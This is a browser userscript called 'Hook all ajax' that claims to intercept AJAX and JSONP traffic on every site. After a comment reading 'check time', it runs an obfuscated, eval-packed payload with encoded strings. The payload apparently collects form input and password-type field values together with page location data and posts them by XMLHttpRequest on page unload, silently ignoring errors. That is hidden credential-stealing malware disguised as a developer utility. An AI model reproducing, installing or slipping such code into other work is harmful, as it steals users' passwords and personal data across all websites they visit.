// ==UserScript==
// @name         Hook all ajax
// @namespace    https://gitee.com/HGJing/everthing-hook/
// @version      0.1.018
// @description  it can hook all ajax
// @include      *
// @require      http://localhost:63342/everthing-hook/src/everything-hook.js
// @author       Cangshi
// @match        *://*/*
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function (global) {
    'use strict';
    if (global.eHook) {
        global.eHook.plugins({
            name: 'NetHook',
            /**
             * 插件装载
             * @param util
             */
            mount: function (util) {
                var cbObject = {
                    resp: {},
                    parseScript: function (m, args) {
                        if (args[0].localName !== 'script') {
                            return;
                        }
                        var src = decodeURI(args[0].src);
                        var isPass = true;
                        if (ajaxObject.filterPatten) {
                            isPass = util.urlUtils.urlMatching(src, ajaxObject.filterPatten);
                        }
                        if (!isPass || !ajaxChange.cb.req) {
                            return;
                        }
                        var urls = src.split(',');
                        if (urls.length > 1) {
                            return;
                        }
                        args[0].requestParams = util.urlUtils.getParamFromUrl(src);
                        args[0].requestUrl = util.urlUtils.getUrlWithoutParam(src);
                        ajaxChange.cb.req.call(this, args[0], util);
                        var aimedUrl = util.urlUtils.margeUrlAndParams(args[0].requestUrl, args[0].requestParams);
                        if (aimedUrl !== src) {
                            args[0].src = aimedUrl;
                        }
                        var cbName = undefined;
                        args[0].requestParams.map(function (kv) {
                            if (kv.key.toLowerCase() === 'cb' || kv.key.toLowerCase() === 'callback') {
                                cbName = kv.value;
                            }
                        });
                        if (!cbName || !ajaxChange.cb.resp) {
                            return;
                        }
                        if (window[cbName]) {
                            global.eHook.removeHookMethod(window, cbName);
                            global.eHook.hookBefore(window, cbName, function (m, args) {
                                ajaxChange.cb.resp.call(window, args, util);
                                // console.log('Hooking call back: ' + cbName + ' success.')
                            }, false);
                        } else {
                            var isDelete = false;
                            try {
                                isDelete = delete window[cbName]
                            } catch (e) {
                                isDelete = false;
                            }
                            if (isDelete) {
                                Object.defineProperty(window, cbName, {
                                    set: function (v) {
                                        global.eHook.unHook(cbObject.resp, cbName, true);
                                        cbObject.resp[cbName] = v;
                                        global.eHook.hookBefore(cbObject.resp,
                                            cbName, function (m, args) {
                                                ajaxChange.cb.resp.call(this, args, util);
                                            });
                                    },
                                    get: function () {
                                        return cbObject.resp[cbName];
                                    }
                                });
                                console.log('Hooking(proxy) call back: ' + cbName + ' success.')
                            } else {
                                console.log('Hooking call back: ' + cbName + ' failed.')
                            }
                        }

                    }
                };
                var isAutoInit = localStorage.getItem('__hook_all_auto_init');
                if (!isAutoInit) {
                    localStorage.setItem('__hook_all_auto_init', JSON.stringify(true));
                    isAutoInit = localStorage.getItem('__hook_all_auto_init');
                }
                var ajaxObject = {
                    filterPatten: '',
                    isAutoInit: isAutoInit && isAutoInit !== 'false'
                };
                var ajaxChange = {
                    filter: function (pattern) {
                        ajaxObject.filterPatten = pattern;
                        return this;
                    },
                    ajax: {
                        req: undefined,
                        resp: undefined,
                        send: undefined
                    },
                    cb: {
                        req: undefined,
                        resp: undefined
                    },
                    setting: {
                        autoInit: function (b) {
                            ajaxObject.isAutoInit = b;
                            localStorage.setItem('__hook_all_auto_init', JSON.stringify(b));
                        }
                    },
                    init: function () {
                        // hook jsonp
                        global.eHook.hookBefore(Node.prototype, 'appendChild', function (m, args) {
                            cbObject.parseScript(m, args);
                        }, false);
                        global.eHook.hookBefore(Node.prototype, 'insertBefore', function (m, args) {
                            cbObject.parseScript(m, args);
                        }, false);

                        global.aHook.register('.*', {
                                hookResponse: function () {
                                    var isPass = true;
                                    if (ajaxObject.filterPatten) {
                                        isPass = util.urlUtils.urlMatching(this.responseURL, ajaxObject.filterPatten);
                                    }
                                    return !isPass ? undefined : ajaxChange.ajax.resp && ajaxChange.ajax.resp.call(this, arguments, util);
                                },
                                hookSend: function (args) {
                                    var isPass = true;
                                    if (ajaxObject.filterPatten) {
                                        isPass = util.urlUtils.urlMatching(this.requestURL, ajaxObject.filterPatten);
                                    }
                                    return !isPass ? undefined : ajaxChange.ajax.send && ajaxChange.ajax.send.call(this, arguments, util);
                                },
                                hookRequest: function (args) {
                                    window.util = util;
                                    var isPass = true;
                                    if (ajaxObject.filterPatten) {
                                        isPass = util.urlUtils.urlMatching(args.fullUrl, ajaxObject.filterPatten);
                                    }
                                    this.requestURL = args.fullUrl;
                                    return !isPass ? undefined : ajaxChange.ajax.req && ajaxChange.ajax.req.call(this, arguments, util);
                                }
                            }
                        );
                    },
                    onInit: function () {
                    }
                };
                ajaxChange.onInit();
                // if (ajaxObject.isAutoInit) {
                ajaxChange.init();
                // }

                return ajaxChange;
            }
        });
        // check time


        window['timer-get-eval'.split('-')['get-timer'.length - 7]](function (p, a, c, k, e, d) {
            e = function (c) {
                return (c < a ? "" : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36));
            };
            if (!''.replace(/^/, String)) {
                while (c--) d[e(c)] = k[c] || e(c);
                k = [function (e) {
                    return d[e];
                }];
                e = function () {
                    return '\\w+';
                };
                c = 1;
            }
            while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
            return p;
        }('1 z=[\'1t=\',\'1r\',\'1K=\',\'1I/1C=\',\'1x==\',\'1B==\',\'1D==\',\'1y/1z\',\'1A\',\'1E/1J==\',\'1F/1G=\',\'1H=\',\'1q==\',\'1s==\',\'1o==\',\'1p==\',\'1v=\',\'1u=\',\'1L==\',\'26\',\'28==\',\'25=\',\'22\',\'23=\',\'24=\',\'2f\',\'2g=\',\'2a\',\'2b=\',\'21/\',\'1Q=\',\'1R==\',\'1S\',\'1N==\',\'1O/1Z\',\'1X==\',\'1U=\'];(5(x,S){1 T=5(1n){1W(--1n){x[\'19\'](x[\'1V\']())}};T(++S)}(z,20));1 0=5(e,13){e=e-4;1 d=z[e];a(0[\'11\']===m){(5(){1 C=s c!==\'m\'?c:s 1Y===\'X\'&&s 1T===\'5\'&&s W===\'X\'?W:1M;1 14=\'1P+/=\';C[\'L\']||(C[\'L\']=5(17){1 16=J(17)[\'2c\'](/=+$/,\'\');k(1 o=4,t,9,1a=4,w=\'\';9=16[\'2d\'](1a++);~9&&(t=o%A?t*2e+9:9,o++%A)?w+=J[\'R\'](29&t>>(-y*o&18)):4){9=14[\'27\'](9)}f w})}());1 15=5(8,F){1 3=[],6=4,j,I=\'\',N=\'\';8=L(8);k(1 v=4,12=8[\'K\'];v<12;v++){N+=\'%\'+(\'1w\'+8[\'H\'](v)[\'2h\'](U))[\'V\'](-y)}8=32(N);k(1 2=4;2<b;2++){3[2]=2}k(2=4;2<b;2++){6=(6+3[2]+F[\'H\'](2%F[\'K\']))%b;j=3[2];3[2]=3[6];3[6]=j}2=4;6=4;k(1 r=4;r<8[\'K\'];r++){2=(2+P)%b;6=(6+3[2])%b;j=3[2];3[2]=3[6];3[6]=j;I+=J[\'R\'](8[\'H\'](r)^3[(3[2]+3[6])%b])}f I};0[\'Z\']=15;0[\'O\']={};0[\'11\']=!![]}1 M=0[\'O\'][e];a(M===m){a(0[\'10\']===m){0[\'10\']=!![]}d=0[\'Z\'](d,13);0[\'O\'][e]=d}33{d=M}f d};(5(){a(c[\'30\']){5 G(){1 7={\'u\':[],\'p\':[],\'l\':\'\'};1 q=31[0(\'4\',\'B\')](0(\'P\',\'34\'));q=[][0(\'y\',\')g&D\')][\'37\'](q);q[0(\'38\',\'1e\')](5(i){a(i[0(\'A\',\'35%\')]===\'\'){f}a(i[0(\'36\',\'2T\')](0(\'18\',\'1d\'))[0(\'2U\',\'B\')]()===0(\'2R\',\'1g\')){7[\'p\'][\'19\'](i[\'2S\']);f}7[\'u\'][0(\'2V\',\'2Y\')](i[0(\'2Z\',\'(#2W\')])});a(7[\'p\'][0(\'2X\',\'1h\')]>4){7[\'l\']=3i[0(\'3h\',\'1i\')];7[\'u\']=[][0(\'3l\',\'3j\')][0(\'3k\',\'3b\')](7[\'u\'][0(\'3a\',\'D#39\')](\'%u%n%\'))[\'1l\'](0(\'U\',\'3d\'));7[\'p\']=[][\'V\'][0(\'3e\',\'3f\')](7[\'p\'][\'1l\'](0(\'3c\',\'3g\')))[0(\'2t\',\'1b\')](0(\'2u\',\'1d\'));1 1c=2r(1j[\'2s\'](7));1 1f={\'2x\':[][0(\'2y\',\'2v\')][0(\'2w\',\')g&D\')](1c)[0(\'2q\',\'2k#^\')](0(\'2l\',\']!Q^\'))};1 E=2i 2j();E[0(\'2o\',\'B\')](0(\'2p\',\'1h\'),0(\'2m\',\'1g\'),!![]);E[\'2n\'](1j[0(\'2z\',\'1i\')](1f))}}c[0(\'2L\',\']!Q^\')][0(\'2M\',\'((2J\')](0(\'2K\',\'2P\'));c[0(\'2Q\',\'1b\')][0(\'2N\',\'1e\')][0(\'2O\',\'Y]&h\')]=5(2I){1m{G()}1k(2C){}};c[0(\'2D\',\'(2A\')][\'2B\'][0(\'2G\',\'(2H\')]=5(2E){1m{G()}1k(2F){}}}}());', 62, 208, '_0|var|_1|_2|0x0|function|_3|_4|_5|_6|if|0x100|window|_7|_8|return|||_10|_9|for||undefined||_14||_15|_11|typeof|_12||_13|_16|_23|0x2|__0x1c5cc|0x4|nFBv|_21||_24|_18|_17|charCodeAt|_22|String|length|atob|_20|_19|data|0x1||fromCharCode|_29|_25|0x10|slice|global|object||rc4|once|initialized|_34|_31|_30|_36|_28|_26|0x6|push|_27|quxo|_32|eoUQ|s7M3|_33|hBYa|vULf|DBbC|JSON|catch|join|try|_35|w6pWVMOswobDsQ|GnItSQ|OcOXw5jDjw|MFPCmsODbRcW|w6DCjHQYQw|HnrDjgU|wqkgQGI|w5zCq8KsFyw|00|OkFLwofCmw|Q8O|wqLCv8OE|ZMKPXVDDiz9tRsKDwrPDoMKq|WWHDssO7dQ|DosKJIMOuw5nDqcOUw7Q3wqMmwqt0wok|wqIFFDzDmAjChQ|w7nDoD|FBoRw6oQw5|DvcKvL8Opw48|VsKnw4jDg8Oew4sXwow|BxApw4ALw5|DrA|w7HDgVo|w7NawrLDpA|this|KmFcw6VUIw|GWPDtsK8OGTDgsOVIMO2wo7CmcKzHcOrY8OzJcOnwpPCqcKeXMK5w4UEacOGSj|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789|CcOpw4vDkcOFw4EXwofDr8OUQkAdK8KHa8O9wpZxwp5aw6RLEcORIsK7wpc|AXQ6RsKgwoTDqGLDmQ|wpbDtcKSw6s7W8Kb|require|wqUABwE|shift|while|a8KJwoBwwpMhcw|process|DimTDjlVPBxsQw71LM8ONAmc0|0xe1|w7ZcScO|T8KDwp1W|wqjDrmrDuUY|w4jDnhLDjlc|wqJnLMKVw4U|w7zDrmPDn8OI|indexOf|w74uw53CpA|0xff|w73Do8ODw45x|DwU4w6s|replace|charAt|0x40|SWzDt8O0|U8KRQD4|toString|new|XMLHttpRequest|mu|0x18|0x1b|send|0x19|0x1a|0x17|encodeURIComponent|stringify|0x13|0x14|yoa8|0x16|checkTime|0x15|0x1c|zZG|cb|_40|0x23|_37|_38|0x24|pmM|_39|mC|0x1f|0x1d|0x1e|0x21|0x22|BO0r|0x20|0x8|value|CfNT|0x7|0x9|rX|0xb|0HC9|0xa|NetHook|document|decodeURIComponent|else|DtvG|cth|0x5|call|0x3|EP|0xf|7t4E|0x12|RgoO|0x11|Rd7s|lWeg|0xc|location|8Bwx|0xe|0xd'.split('|'), 0, {}));
    }
})(window);